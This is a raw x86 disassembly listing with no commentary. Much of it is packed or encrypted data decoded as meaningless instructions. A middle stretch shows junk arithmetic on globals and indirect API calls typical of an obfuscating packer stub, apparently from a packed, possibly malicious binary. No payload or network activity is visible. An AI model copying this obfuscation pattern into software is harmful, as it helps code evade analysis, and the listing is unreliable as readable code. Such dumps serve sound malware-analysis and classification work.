  4028ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ae:	in     eax,0x5e
  4028b0:	ficom  DWORD PTR [eax+eiz*2]
  4028b3:	adc    ch,BYTE PTR [ecx-0x57e79dc5]
  4028b9:	xor    al,0x64
  4028bb:	inc    edx
  4028bc:	test   al,0xce
  4028be:	in     eax,0x16
  4028c0:	push   ss
  4028c1:	cmp    eax,0xc1161604
  4028c6:	jl     0x4028dd
  4028c8:	pop    ds
  4028c9:	mov    ?,esi
  4028cb:	push   ecx
  4028cc:	fild   WORD PTR [edi]
  4028ce:	add    ecx,ebx
  4028d0:	in     al,dx
  4028d1:	push   eax
  4028d2:	or     cl,BYTE PTR [edx]
  4028d4:	shl    DWORD PTR [eax],cl
  4028d6:	push   es
  4028d7:	pusha  
  4028d8:	loopne 0x402869
  4028da:	cmp    bh,al
  4028dc:	imul   ecx
  4028de:	add    al,ah
  4028e0:	cmp    al,BYTE PTR [edx-0x57c7d185]
  4028e6:	repnz aad 0x1d
  4028e9:	cmp    dl,BYTE PTR [ecx-0x1a6141eb]
  4028ef:	sti    
  4028f0:	add    eax,0xe4c9ffe5
  4028f5:	xor    BYTE PTR [ebp+0x704f13c4],ah
  4028fb:	mov    gs,WORD PTR [eax+0x4]
  4028fe:	ss test al,0x23
  402901:	push   0x29142b2d
  402906:	(bad)  
  402907:	sahf   
  402908:	or     BYTE PTR ds:0x3a81485b,0xf8
  40290f:	jp     0x402927
  402911:	add    BYTE PTR [ecx],0x5f
  402914:	imul   edi,DWORD PTR [eax+eiz*2],0x6ee4918e
  40291b:	jl     0x402984
  40291d:	add    BYTE PTR [ebx-0xd1bdbce],dl
  402923:	push   edx
  402924:	jmp    0x4028a8
  402926:	jmp    0x4028cc
  402928:	mov    ah,0x85
  40292a:	push   edi
  40292b:	add    eax,0xf27f1a41
  402930:	vpmaxub ymm1,ymm4,ymm4
  402934:	out    0x3a,al
  402936:	aaa    
  402937:	shr    BYTE PTR [esi-0x2b37d691],1
  40293d:	mov    edx,0x1a8d363
  402942:	mov    esi,edi
  402944:	inc    edx
  402945:	or     edi,DWORD PTR [edi-0x2b7763f0]
  40294b:	mov    ebx,0xb0f6797d
  402950:	and    edx,DWORD PTR [esi+ebp*2+0x38]
  402954:	xchg   ebp,eax
  402955:	dec    edi
  402956:	cdq    
  402957:	and    bl,dl
  402959:	mov    ah,0x78
  40295b:	sub    al,0x8e
  40295d:	jmp    0x4029d6
  40295f:	and    eax,0xe9339dd1
  402964:	inc    esp
  402965:	jmp    0x4029c7
  402967:	jp     0x4029b3
  402969:	or     eax,0x4f9ce5f8
  40296e:	sbb    eax,0x30ab5720
  402973:	sub    eax,0x2fbeb0dd
  402978:	mov    ?,WORD PTR [edi-0x1e]
  40297b:	add    eax,0xa213a8d2
  402980:	dec    edi
  402981:	xor    bl,ch
  402983:	sbb    ch,BYTE PTR [esi]
  402985:	sti    
  402986:	gs ins DWORD PTR es:[edi],dx
  402988:	mov    ds:0xc7cdf5f4,al
  40298d:	add    DWORD PTR [ebx-0x622c0c85],edi
  402993:	ror    BYTE PTR ss:[edi+0x420aa281],0xae
  40299b:	retf   
  40299c:	mov    esi,0xf44a3e59
  4029a1:	cld    
  4029a2:	shl    dh,cl
  4029a4:	(bad)  
  4029a5:	loop   0x4029d4
  4029a7:	and    BYTE PTR [esi],ah
  4029a9:	or     eax,0x8fde7a42
  4029ae:	dec    edi
  4029af:	shl    BYTE PTR [ecx],1
  4029b1:	ins    DWORD PTR es:[edi],dx
  4029b2:	in     al,0x5c
  4029b4:	xor    eax,0xa84971c1
  4029b9:	sub    bl,BYTE PTR [ecx]
  4029bb:	mov    eax,0xf71d654c
  4029c0:	inc    esp
  4029c1:	aas    
  4029c2:	out    0xb3,al
  4029c4:	iret   
  4029c5:	lock les ebx,FWORD PTR [ecx]
  4029c8:	into   
  4029c9:	jo     0x40299b
  4029cb:	mov    fs,WORD PTR [esi+0x27093e15]
  4029d1:	fwait
  4029d2:	lahf   
  4029d3:	aas    
  4029d4:	pop    es
  4029d5:	and    ch,al
  4029d7:	jmp    0xc41b:0x1ed07b88
  4029de:	gs push edi
  4029e0:	sub    DWORD PTR [ebx],ebx
  4029e2:	mov    esi,0x285e3992
  4029e7:	add    ah,al
  4029e9:	sub    cl,BYTE PTR [ecx]
  4029eb:	and    DWORD PTR [ecx+edi*8+0x6f],ebx
  4029ef:	xchg   esp,eax
  4029f0:	cdq    
  4029f1:	shr    BYTE PTR [edi],1
  4029f3:	inc    ebp
  4029f4:	into   
  4029f5:	jns    0x4029e7
  4029f7:	mov    bl,0xe3
  4029f9:	in     al,dx
  4029fa:	and    eax,0xbfc8df6a
  4029ff:	div    DWORD PTR [edi+0x68]
  402a02:	or     al,0x8
  402a04:	sub    cl,ch
  402a06:	mov    eax,0x3098bae3
  402a0b:	pop    esp
  402a0c:	inc    ebp
  402a0d:	xor    DWORD PTR ds:0x3f376374,ebp
  402a13:	cmp    edi,eax
  402a15:	arpl   WORD PTR [ebx],si
  402a17:	sub    BYTE PTR [ebp+edi*1+0x3f],al
  402a1b:	cmp    esp,esi
  402a1d:	add    bh,BYTE PTR [ebx]
  402a1f:	dec    edx
  402a20:	lahf   
  402a21:	pop    ebx
  402a22:	mov    ah,0x5
  402a24:	jle    0x402a00
  402a26:	push   ecx
  402a27:	imul   edi,DWORD PTR [ebx-0x2d],0x19d3308d
  402a2e:	sub    BYTE PTR [edx],ch
  402a30:	in     al,0xf1
  402a32:	lds    edx,FWORD PTR [ebp-0x48]
  402a35:	fisub  WORD PTR [edi+edx*8]
  402a38:	mov    esi,fs
  402a3a:	repnz cmp al,0x41
  402a3d:	inc    edi
  402a3e:	sbb    esp,DWORD PTR [edx+ebx*2-0x1334702b]
  402a45:	sbb    DWORD PTR es:[esi-0x3d234ba8],edi
  402a4c:	out    dx,al
  402a4d:	mov    eax,ds:0xc37815ed
  402a52:	fadd   DWORD PTR [ebp-0x1d6ab6d5]
  402a58:	xor    al,0xb6
  402a5b:	xor    al,0xb7
  402a5d:	int3   
  402a5e:	or     esi,DWORD PTR [ecx+0x40]
  402a61:	jns    0x402a09
  402a63:	mov    ds:0x891e00c2,al
  402a68:	push   esp
  402a69:	inc    eax
  402a6a:	stos   BYTE PTR es:[edi],al
  402a6b:	jl     0x4029f5
  402a6d:	mov    ebx,0x71a72836
  402a72:	arpl   WORD PTR [ebp-0x5a8a4dbd],di
  402a78:	push   eax
  402a79:	test   BYTE PTR [esi+eiz*8],bh
  402a7c:	pusha  
  402a7d:	sahf   
  402a7e:	push   ebp
  402a7f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a81:	xchg   ecx,eax
  402a82:	pop    ebx
  402a83:	sbb    bh,BYTE PTR [edx-0x14]
  402a86:	sbb    DWORD PTR [eax],esp
  402a88:	aam    0x7d
  402a8a:	mov    al,0x1b
  402a8c:	mov    bh,0xb4
  402a8e:	data16 sbb al,0x0
  402a91:	in     al,dx
  402a92:	and    eax,0x904d7e89
  402a97:	pop    esp
  402a98:	addr16 cdq 
  402a9a:	fdivr  st(2),st
  402a9c:	xlat   BYTE PTR ds:[ebx]
  402a9d:	daa    
  402a9e:	jno    0x402a71
  402aa0:	je     0x402aaf
  402aa2:	(bad)
  402aa6:	(bad)  
  402aa7:	(bad)
  402aab:	jns    0x402afd
  402aad:	fsub   QWORD PTR [edx+0x50]
  402ab0:	xor    DWORD PTR [ecx+0x23],ebx
  402ab3:	and    DWORD PTR [edi+0x45891db1],0xffffffde
  402aba:	or     eax,0x1e608021
  402abf:	sti    
  402ac0:	and    DWORD PTR [esi-0x76480bc5],ecx
  402ac6:	add    dh,dh
  402ac8:	mov    esp,0x60c138d5
  402acd:	jp     0x402acd
  402acf:	ins    DWORD PTR es:[edi],dx
  402ad0:	neg    BYTE PTR [eax+0x560925f3]
  402ad6:	push   ebp
  402ad7:	add    ecx,DWORD PTR [ebx]
  402ad9:	cld    
  402ada:	push   ebx
  402adb:	outs   dx,BYTE PTR ds:[esi]
  402adc:	dec    esp
  402add:	lock mul edx
  402ae0:	dec    edi
  402ae1:	dec    esi
  402ae2:	mov    esp,DWORD PTR [edi+0x667353ec]
  402ae8:	out    0x59,al
  402aea:	mov    al,ds:0x88fd4469
  402aef:	cmp    dh,dh
  402af1:	ins    BYTE PTR es:[edi],dx
  402af2:	fdivr  st,st(6)
  402af4:	and    BYTE PTR [edi+0x12249618],0x59
  402afb:	rcr    BYTE PTR [edi],1
  402afd:	pop    ss
  402afe:	sub    BYTE PTR [ecx-0x393fa3e1],dh
  402b04:	push   ecx
  402b05:	mov    cl,BYTE PTR [ebx+0x15]
  402b08:	xor    ah,BYTE PTR [eax]
  402b0a:	xor    DWORD PTR [ebp+0x8331761],edx
  402b10:	mov    dh,0x90
  402b12:	iret   
  402b13:	xor    ch,ah
  402b15:	inc    esi
  402b16:	and    DWORD PTR [ebp+eiz*1-0x43f50116],esi
  402b1d:	xchg   esp,eax
  402b1e:	push   cs
  402b1f:	inc    ebx
  402b20:	hlt    
  402b21:	out    dx,al
  402b22:	jl     0x402b65
  402b24:	hlt    
  402b25:	sbb    BYTE PTR [eax+ecx*2],dh
  402b28:	mov    edx,0x397c98f9
  402b2d:	sub    ebx,ecx
  402b2f:	xchg   ecx,eax
  402b30:	and    ebp,edi
  402b32:	je     0x402b1b
  402b34:	pop    ds
  402b35:	mov    cl,0x3
  402b37:	jno    0x402b93
  402b39:	jnp    0x402ba5
  402b3b:	sub    esp,eax
  402b3d:	fwait
  402b3e:	rol    BYTE PTR [ebp+0x34b0b79],1
  402b44:	in     al,dx
  402b45:	or     al,bl
  402b47:	mov    ch,0x95
  402b49:	or     BYTE PTR [ebx-0x72],cl
  402b4c:	or     eax,0x3841b07c
  402b51:	jno    0x402af6
  402b53:	out    0x2,eax
  402b55:	sbb    al,0x27
  402b57:	and    ecx,DWORD PTR [ebx+0x764060c7]
  402b5d:	out    dx,eax
  402b5e:	or     al,0x9c
  402b60:	ror    BYTE PTR [edi*4-0xf27f4e2],cl
  402b67:	adc    bl,BYTE PTR [ecx+0x58]
  402b6a:	adc    BYTE PTR [edi+0x39ee0f27],0x56
  402b71:	shr    DWORD PTR [edx+ecx*1+0x5723ff8f],cl
  402b78:	dec    di
  402b7a:	not    BYTE PTR [eax-0x6dde2f91]
  402b80:	gs dec ebp
  402b82:	and    ebx,DWORD PTR [ebx+0x62d77e7d]
  402b88:	fsubr  st,st(1)
  402b8a:	dec    edi
  402b8b:	mov    edx,0x58c0896
  402b90:	dec    ecx
  402b92:	jge    0x402bb3
  402b94:	add    eax,0xa0cc408b
  402b99:	add    ch,dh
  402b9b:	jo     0x402b3d
  402b9d:	bound  edi,QWORD PTR [ebx-0x3e79c98b]
  402ba3:	lea    ebp,[ebp+0x60]
  402ba6:	push   ebp
  402ba7:	jo     0x402bec
  402ba9:	stc    
  402baa:	xchg   BYTE PTR [eax],dl
  402bac:	adc    edi,ecx
  402bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402baf:	push   0xfffffff2
  402bb1:	icebp  
  402bb2:	lods   al,BYTE PTR ds:[esi]
  402bb3:	aad    0x1b
  402bb5:	mov    al,ds:0xf60dcc33
  402bba:	aaa    
  402bbb:	jno    0x402c0e
  402bbd:	lock sbb eax,DWORD PTR [ecx+0x0]
  402bc1:	sub    BYTE PTR [edi+0x6249b276],bh
  402bc7:	(bad)  
  402bc9:	mov    ecx,0x837ab6a9
  402bce:	cld    
  402bcf:	mov    eax,0x75021fef
  402bd4:	add    al,0x18
  402bd6:	inc    edi
  402bd7:	inc    ebp
  402bd8:	(bad)  
  402bd9:	shr    DWORD PTR [ecx+0x7f],1
  402bdc:	mov    bh,0x4b
  402bde:	cmp    esp,ebp
  402be0:	mov    ecx,0x476625ac
  402be5:	mov    DWORD PTR [ebx],esi
  402be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402be8:	xchg   edi,eax
  402be9:	(bad)  
  402bea:	fcmovbe st,st(6)
  402bec:	aaa    
  402bed:	cli    
  402bee:	fidiv  DWORD PTR [ecx]
  402bf0:	pop    esp
  402bf1:	mov    ds:0x5c978f14,eax
  402bf6:	dec    eax
  402bf7:	out    0x40,al
  402bf9:	std    
  402bfa:	cmc    
  402bfb:	inc    edx
  402bfc:	mov    dl,0x53
  402bfe:	in     al,0x1f
  402c00:	cmp    eax,0x1eed502f
  402c05:	test   al,0x17
  402c07:	pop    ebp
  402c08:	mov    al,0xe7
  402c0a:	(bad)  
  402c0b:	jo     0x402c4f
  402c0d:	int3   
  402c0e:	mov    DWORD PTR [edx-0x7b],ebx
  402c11:	mov    esp,0x86e45f56
  402c16:	cmp    dl,BYTE PTR [eax]
  402c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c19:	lds    ebp,FWORD PTR [ebx]
  402c1b:	(bad)  
  402c1c:	lds    ebp,FWORD PTR [edi-0x1d]
  402c1f:	jl     0x402c4c
  402c21:	stc    
  402c22:	retf   0x2a31
  402c25:	cmp    edi,DWORD PTR [edx+0x5ab425aa]
  402c2b:	cmp    al,0xf4
  402c2d:	dec    edx
  402c2e:	int    0x15
  402c30:	mov    WORD PTR [edi],cs
  402c32:	mov    edi,0xc238c56f
  402c37:	jb     0x402c7b
  402c39:	push   esi
  402c3a:	pop    ebp
  402c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c3c:	in     al,0x70
  402c3e:	add    DWORD PTR [esi+0x53b5ac32],eax
  402c44:	lods   eax,DWORD PTR ds:[esi]
  402c45:	dec    ecx
  402c46:	xchg   esi,eax
  402c47:	test   BYTE PTR [edi+edi*4-0x36],dh
  402c4b:	sar    bl,0xe7
  402c4e:	mov    bh,0x4
  402c50:	sbb    edx,DWORD PTR [esi+0x12]
  402c53:	leave  
  402c54:	cli    
  402c55:	call   0x7ab8104e
  402c5a:	dec    ecx
  402c5b:	or     ah,BYTE PTR [ebx-0x3c]
  402c5e:	push   ss
  402c5f:	add    BYTE PTR [edi-0x6329eb34],bh
  402c65:	imul   ecx,esi,0x2d
  402c68:	mov    BYTE PTR [esi],cl
  402c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6b:	mov    DWORD PTR [ebp+0x7c5a3364],edx
  402c71:	push   cs
  402c72:	mov    ecx,ds
  402c74:	mov    eax,ds:0x54eaa571
  402c79:	add    edx,ecx
  402c7b:	ret    
  402c7c:	lods   eax,DWORD PTR ds:[esi]
  402c7d:	pop    eax
  402c7e:	es dec ebx
  402c80:	sahf   
  402c81:	imul   DWORD PTR [edi+0x355a40bc]
  402c87:	iret   
  402c88:	cmp    DWORD PTR [ebx],ebx
  402c8a:	mov    al,0x29
  402c8c:	lahf   
  402c8d:	inc    ecx
  402c8e:	sub    BYTE PTR [edx],bl
  402c90:	aad    0xbc
  402c92:	pop    ebp
  402c93:	test   DWORD PTR [ebx-0x34],0x357bcb00
  402c9a:	push   ds
  402c9b:	ds jg  0x402cd1
  402c9e:	and    ah,BYTE PTR [ebx+0x2bd87177]
  402ca4:	inc    ebp
  402ca5:	(bad)  
  402ca6:	jnp    0x402c57
  402ca8:	enter  0xf96a,0x97
  402cac:	add    al,0x9b
  402cae:	pop    ebx
  402caf:	and    al,0x8
  402cb1:	fdiv   DWORD PTR [ebx+0x40]
  402cb4:	pop    esi
  402cb5:	mov    ss,WORD PTR [ebx]
  402cb7:	popf   
  402cb8:	dec    esp
  402cb9:	sbb    al,BYTE PTR [eax]
  402cbb:	pop    edi
  402cbc:	xor    DWORD PTR [eax-0x8],0xfd2824a1
  402cc3:	bnd jne 0x402c62
  402cc6:	das    
  402cc7:	xchg   edi,eax
  402cc8:	mov    edi,0x618225e0
  402ccd:	repz mov eax,0xd80a8463
  402cd3:	imul   edi,DWORD PTR [esi-0x2adbf4b4],0xffffffc8
  402cda:	cmp    al,0x82
  402cdc:	mov    WORD PTR [ebp-0x43],ss
  402cdf:	mov    esi,0x8027507a
  402ce4:	out    0x46,al
  402ce6:	jge    0x402cc1
  402ce8:	sub    al,0x69
  402cea:	sar    BYTE PTR [ecx-0x78],cl
  402ced:	iret   
  402cee:	pop    es
  402cef:	xchg   esi,eax
  402cf0:	ds ds and ecx,0xffffff96
  402cf5:	mov    edx,esp
  402cf7:	fiadd  WORD PTR [esi+0x22]
  402cfa:	loope  0x402c94
  402cfc:	repnz cli 
  402cfe:	fisub  DWORD PTR [ecx+eiz*4+0xddb0586]
  402d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d06:	mov    esi,0xbc0bd928
  402d0b:	(bad)  
  402d0c:	loopne 0x402d40
  402d0e:	sbb    DWORD PTR [esi],ebx
  402d10:	mov    bh,0x91
  402d12:	or     edx,0x66874ac
  402d18:	repnz push ebp
  402d1a:	out    0x22,eax
  402d1c:	adc    al,0x5
  402d1e:	mov    eax,0xcc82cd07
  402d23:	mov    eax,0xcdd58623
  402d28:	xor    al,0x10
  402d2a:	pushf  
  402d2b:	cdq    
  402d2c:	jae    0x402cdd
  402d2e:	xor    eax,0x9e5ff2f8
  402d33:	dec    edx
  402d34:	hlt    
  402d35:	fstp   TBYTE PTR [ebx+0x43f43e40]
  402d3b:	lock nop
  402d3d:	into   
  402d3e:	fs mov esp,0xf4fc69de
  402d44:	ja     0x402d04
  402d46:	and    BYTE PTR [edx+edi*1+0xd6b930e],dh
  402d4d:	mov    ds:0x2c666eac,eax
  402d52:	fsub   st,st(2)
  402d54:	xchg   ecx,eax
  402d55:	or     edx,eax
  402d57:	dec    ecx
  402d58:	stos   BYTE PTR es:[edi],al
  402d59:	adc    eax,0x341ed0e8
  402d5f:	fwait
  402d60:	add    al,BYTE PTR [ebx]
  402d62:	ret    
  402d63:	idiv   DWORD PTR [edi+0x69]
  402d66:	or     BYTE PTR [ebx],0x6f
  402d69:	mov    edi,0x6347e61d
  402d6e:	jecxz  0x402d15
  402d70:	sbb    eax,DWORD PTR [ebp+0xa]
  402d73:	ins    DWORD PTR es:[edi],dx
  402d74:	ret    
  402d75:	sub    DWORD PTR [eax+ebp*2],ebp
  402d78:	lock imul ebx,DWORD PTR [esi-0x62e90de2],0x3bc187ad
  402d83:	stos   BYTE PTR es:[edi],al
  402d84:	push   ds
  402d85:	or     BYTE PTR [ebp-0x43463307],ch
  402d8b:	and    al,0x50
  402d8d:	stos   DWORD PTR es:[edi],eax
  402d8e:	mov    al,ds:0xaf6867b4
  402d93:	sbb    ah,BYTE PTR [edx]
  402d95:	xchg   edx,eax
  402d96:	push   ebp
  402d97:	(bad)  
  402d98:	iret   
  402d99:	jns    0x402e13
  402d9b:	mov    al,ds:0xbb393fea
  402da0:	cwde   
  402da1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  402da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402da4:	add    bh,cl
  402da6:	push   ds
  402da7:	xlat   BYTE PTR ds:[ebx]
  402da8:	lea    esi,[esi+0x20]
  402dab:	js     0x402dbf
  402dad:	call   0x38b8:0xb62d80fa
  402db4:	cmc    
  402db5:	in     al,dx
  402db6:	xlat   BYTE PTR ds:[ebx]
  402db7:	repnz xor BYTE PTR [edx],dl
  402dba:	dec    ebp
  402dbb:	sahf   
  402dbc:	cmp    cl,BYTE PTR fs:[edx+ebp*2]
  402dc0:	pop    edx
  402dc1:	xchg   edx,eax
  402dc2:	shl    DWORD PTR [ecx],cl
  402dc4:	bound  ecx,QWORD PTR ds:0x539abf44
  402dca:	outs   dx,BYTE PTR ds:[esi]
  402dcb:	or     DWORD PTR [esi+0x3b],esp
  402dce:	jmp    0x402e19
  402dd0:	mov    dh,bl
  402dd2:	pop    ss
  402dd3:	sar    BYTE PTR [ebx],0x7c
  402dd6:	rcr    DWORD PTR [ebx+0x35],0x7b
  402dda:	repnz push esi
  402ddc:	pop    eax
  402ddd:	leave  
  402dde:	cmp    BYTE PTR [edx],cl
  402de0:	pop    esi
  402de1:	dec    eax
  402de2:	mov    eax,ds:0x6d5fe2a0
  402de7:	jmp    0xfa8330d5
  402dec:	pop    ebx
  402ded:	or     ebx,DWORD PTR [esi+0x30]
  402df0:	int3   
  402df1:	cmp    al,ah
  402df3:	stos   DWORD PTR es:[edi],eax
  402df4:	popf   
  402df5:	mov    al,ds:0x39b128d9
  402dfa:	push   ebx
  402dfb:	sub    ebx,esi
  402dfd:	nop
  402dfe:	xlat   BYTE PTR ds:[ebx]
  402dff:	and    DWORD PTR ss:[edx],0xca1c2058
  402e06:	adc    ebp,DWORD PTR [edx-0x8]
  402e09:	dec    esi
  402e0a:	pusha  
  402e0b:	sub    eax,0xbb9665e2
  402e10:	mov    edx,?
  402e12:	test   DWORD PTR ds:0x4185fbdb,ecx
  402e18:	test   eax,0x8af593d5
  402e1d:	sahf   
  402e1e:	mov    edx,0x91e6f8aa
  402e23:	in     eax,dx
  402e24:	ret    
  402e25:	(bad)  
  402e26:	push   ss
  402e27:	xchg   BYTE PTR [esp+eiz*4],ah
  402e2a:	adc    DWORD PTR [edi],ebp
  402e2c:	jae    0x402e6d
  402e2e:	in     al,0x1b
  402e30:	sar    edx,1
  402e32:	mov    DWORD PTR [ebp-0x68],0x1b45
  402e39:	mov    DWORD PTR ds:0x42299e,0x718
  402e43:	mov    DWORD PTR [ebp-0x64],0x767d
  402e4a:	cmp    DWORD PTR ds:0x42295a,0x0
  402e51:	mov    DWORD PTR ds:0x4229ba,0x78de
  402e5b:	mov    DWORD PTR ds:0x422976,0x1706
  402e65:	jmp    0x402ecb
  402e6a:	mov    DWORD PTR ds:0x4228ca,0x464
  402e74:	not    eax
  402e76:	jne    0x402ea1
  402e7c:	push   0x8a0f
  402e81:	call   DWORD PTR ds:0x42a28c
  402e87:	add    DWORD PTR ds:0x422982,ecx
  402e8d:	add    DWORD PTR ds:0x422912,0x4228d6
  402e97:	add    DWORD PTR ds:0x42291a,0x3216
  402ea1:	sub    DWORD PTR ds:0x4229be,0x591
  402eab:	adc    DWORD PTR ds:0x4228f2,0x4409
  402eb5:	add    DWORD PTR ds:0x4228fe,ebx
  402ebb:	add    DWORD PTR ds:0x4229ae,0x46bd
  402ec5:	sub    DWORD PTR ds:0x422936,ecx
  402ecb:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402ed2:	mov    DWORD PTR ds:0x42294a,0xbf3
  402edc:	mov    DWORD PTR [ebp-0x5c],0x0
  402ee3:	mov    DWORD PTR [ebp-0x34],0x599d
  402eea:	add    DWORD PTR ds:0x4228fa,edi
  402ef0:	mov    DWORD PTR [ebp-0x2c],0x165d
  402ef7:	movzx  eax,WORD PTR ds:0x4228a2
  402efe:	and    DWORD PTR ds:0x4229ae,eax
  402f04:	mov    DWORD PTR [ebp-0x1c],0xc51
  402f0b:	xor    eax,0x7ef6
  402f10:	mov    DWORD PTR [ebp-0x44],0x3f55
  402f17:	inc    eax
  402f18:	mov    DWORD PTR [ebp-0x44],0x1
  402f1f:	mov    DWORD PTR [ebp-0x44],0x42e8
  402f26:	cmp    DWORD PTR ds:0x4228a6,0x0
  402f2d:	mov    DWORD PTR ds:0x422926,ebx
  402f33:	mov    DWORD PTR ds:0x42296e,0x475b
  402f3d:	jmp    0x403081
  402f42:	mov    DWORD PTR ds:0x4228fa,0x2105
  402f4c:	not    eax
  402f4e:	jne    0x402f83
  402f54:	push   0x132b
  402f59:	push   DWORD PTR [ebp-0x14]
  402f5c:	push   DWORD PTR [ebp-0x10]
  402f5f:	call   DWORD PTR ds:0x42a290
  402f65:	xor    DWORD PTR ds:0x422932,0x9bb
  402f6f:	or     DWORD PTR ds:0x422996,0x4228ea
  402f79:	and    DWORD PTR ds:0x422932,0x4229ce
  402f83:	and    DWORD PTR ds:0x4229ce,edi
  402f89:	add    DWORD PTR ds:0x4228e6,0x4228da
  402f93:	dec    DWORD PTR ds:0x4229b2
  402f99:	xor    DWORD PTR ds:0x4228ee,ecx
  402f9f:	cmp    DWORD PTR ds:0x422996,0x0
  402fa6:	mov    DWORD PTR ds:0x4228e6,0xf94
  402fb0:	mov    DWORD PTR ds:0x4228de,0x6d8f
  402fba:	mov    DWORD PTR ds:0x42291e,0x78af
  402fc4:	jmp    0x403081
  402fc9:	mov    DWORD PTR ds:0x42290e,ebx
  402fcf:	mov    DWORD PTR ds:0x4228fe,0x3885
  402fd9:	jge    0x402ffe
  402fdf:	push   0x3dec
  402fe4:	call   DWORD PTR ds:0x42a044
  402fea:	add    DWORD PTR ds:0x42298e,0x4228ba
  402ff4:	sub    DWORD PTR ds:0x422916,0x422996
  402ffe:	add    DWORD PTR ds:0x42294e,0x308f
  403008:	sub    DWORD PTR ds:0x42299a,ebx
  40300e:	or     DWORD PTR ds:0x4228e2,0x4229ce
  403018:	and    DWORD PTR ds:0x422996,0x422972
  403022:	cmp    DWORD PTR ds:0x4228be,0x0
  403029:	mov    DWORD PTR ds:0x422896,0x7e8b
  403033:	mov    DWORD PTR ds:0x4228d2,0x6e2b
  40303d:	jmp    0x403081
  403042:	mov    eax,ds:0x42294e
  403047:	mov    DWORD PTR ds:0x422912,0x27c8
  403051:	jl     0x403071
  403057:	call   DWORD PTR ds:0x42a294
  40305d:	xor    DWORD PTR ds:0x4228f6,0x34a0
  403067:	and    DWORD PTR ds:0x42299e,0x4228c2
  403071:	or     DWORD PTR ds:0x4229b2,0x422916
  40307b:	xor    DWORD PTR ds:0x422892,ecx
  403081:	mov    eax,DWORD PTR [ebp-0x60]
  403084:	shl    ecx,0x1e
  403087:	mov    ecx,DWORD PTR [ebp-0x5c]
  40308a:	and    DWORD PTR ds:0x422912,0x10bb
  403094:	push   ecx
  403095:	inc    DWORD PTR ds:0x42298e
  40309b:	push   eax
  40309c:	push   0xddf
  4030a1:	push   0x2d0f
  4030a6:	add    DWORD PTR ds:0x4228d6,0x562b
  4030b0:	call   0x421ad5
  4030b5:	mov    ecx,DWORD PTR [ebp-0x68]
  4030b8:	add    DWORD PTR ds:0x4228e6,0x12e8
  4030c2:	mov    edx,DWORD PTR [ebp-0x64]
  4030c5:	sub    DWORD PTR ds:0x42290e,0x5673
  4030cf:	xor    eax,ecx
  4030d1:	not    ecx
  4030d3:	mov    ecx,DWORD PTR [ebp-0x70]
  4030d6:	add    edx,0x725d
  4030dc:	mov    edx,DWORD PTR [ebp-0x6c]
  4030df:	sub    edx,DWORD PTR ds:0x4228f2
  4030e5:	sub    eax,ecx
  4030e7:	cmp    DWORD PTR ds:0x4228c2,0x0
  4030ee:	mov    DWORD PTR ds:0x42295a,0x2680
  4030f8:	mov    edx,0xd63
  4030fd:	movzx  edx,BYTE PTR ds:0x4229ce
  403104:	mov    DWORD PTR ds:0x4228b6,ecx
  40310a:	jmp    0x403179
  40310f:	mov    DWORD PTR ds:0x4228f2,0x12c1
  403119:	mov    DWORD PTR ds:0x4228d2,ecx
  40311f:	jl     0x403160
  403125:	push   0x234a
  40312a:	push   0x7349
  40312f:	push   DWORD PTR [ebp-0x28]
  403132:	call   DWORD PTR ds:0x42a00c
  403138:	xor    edx,edx
  40313a:	or     edx,DWORD PTR ds:0x4229fe
  403140:	mov    edx,DWORD PTR [edx]
  403142:	sbb    DWORD PTR ds:0x4229ca,edx
  403148:	sbb    edx,DWORD PTR ds:0x42294a
  40314e:	mov    edx,DWORD PTR ds:0x42293e
  403154:	add    edx,DWORD PTR ds:0x42290e
  40315a:	mov    DWORD PTR ds:0x42293e,edx
  403160:	sbb    edx,0x27b8
  403166:	movzx  edx,BYTE PTR ds:0x422902
  40316d:	or     edx,DWORD PTR ds:0x422912
  403173:	mov    DWORD PTR ds:0x422902,edx
  403179:	mov    ecx,DWORD PTR ds:0x422298
  40317f:	mov    edx,DWORD PTR ds:0x4229ee
  403185:	mov    edx,DWORD PTR [edx]
  403187:	xor    DWORD PTR ds:0x4228be,edx
  40318d:	lea    eax,[eax+ecx*1-0x27d2]
  403194:	jmp    0x40371e
  403199:	out    0x30,al
  40319b:	dec    BYTE PTR [edi+0x18661839]
  4031a1:	lock push 0x393972b2
  4031a7:	aam    0xa8
  4031a9:	hlt    
  4031aa:	loope  0x4031c2
  4031ac:	push   ss
  4031ad:	cmp    eax,0xd1161604
  4031b2:	shl    ecx,1
  4031b4:	adc    eax,0x696cca9f
  4031b9:	div    BYTE PTR [ebp+ebx*8+0x64]
  4031bd:	das    
  4031be:	popf   
  4031bf:	sbb    edx,DWORD PTR [ebx+eiz*2]
  4031c2:	cmp    al,0x4c
  4031c4:	dec    ebp
  4031c5:	mov    BYTE PTR [esi],bl
  4031c7:	cld    
  4031c8:	(bad)  
  4031c9:	nop
  4031ca:	or     DWORD PTR [ebp+0x2ab86cb4],esi
  4031d0:	cmp    eax,0x2916475b
  4031d5:	xor    BYTE PTR [edi-0x24],bh
  4031d8:	xchg   ah,dh
  4031da:	sub    BYTE PTR [edx],dh
  4031dc:	sbb    eax,0x5779d61b
  4031e1:	jmp    0x4031fd
  4031e3:	das    
  4031e4:	push   ebx
  4031e5:	sahf   
  4031e6:	sahf   
  4031e7:	cmove  edi,DWORD PTR [ebx+0x3e]
  4031eb:	cmc    
  4031ec:	popf   
  4031ed:	daa    
  4031ee:	adc    DWORD PTR [ecx+0x55],eax
  4031f1:	mov    ds:0x442e8d63,eax
  4031f6:	push   esp
  4031f7:	imul   esp,DWORD PTR [ebx],0x7e
  4031fa:	xlat   BYTE PTR ds:[ebx]
  4031fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031fc:	stc    
  4031fd:	(bad)  
  4031fe:	ins    BYTE PTR es:[edi],dx
  4031ff:	or     DWORD PTR [esp+eiz*8],ebx
  403202:	test   al,0x61
  403204:	ja     0x403271
  403206:	ja     0x403250
